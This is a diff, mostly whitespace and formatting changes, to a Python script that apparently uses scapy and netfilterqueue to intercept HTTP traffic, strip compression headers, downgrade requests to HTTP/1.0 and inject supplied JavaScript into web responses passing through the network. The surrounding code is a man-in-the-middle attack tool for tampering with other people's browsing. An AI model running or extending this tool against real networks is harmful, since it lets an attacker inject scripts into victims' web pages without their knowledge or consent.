@@ -4,6 +4,7 @@ import scapy.all as scapy
 import netfilterqueue
 import re
 import queue
+
 queue = queue.Queue()
 
 
@@ -14,8 +15,8 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
-def inject(injection_code):
 
+def inject(injection_code):
     def process_packets(packet):
         scapy_packet = scapy.IP(packet.get_payload())
         if scapy_packet.haslayer(scapy.Raw):
@@ -23,7 +24,7 @@ def inject(injection_code):
             if scapy_packet[scapy.TCP].dport == 80:
                 # print("[+] Request")
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-                load = load.replace("HTTP/1.1" , "HTTP/1.0")
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
 
             elif scapy_packet[scapy.TCP].sport == 80:
                 # print("[+] Response")
@@ -43,6 +44,7 @@ def inject(injection_code):
 
         packet.accept()
 
+
 def run_injectjs(injection_code):
     try:
         print(injection_code)
@@ -51,4 +53,4 @@ def run_injectjs(injection_code):
         queue.run()
 
     except KeyboardInterrupt:
-        print ("\n[-] Quitting (InjectJS).................")
+        print("\n[-] Quitting (InjectJS).................")
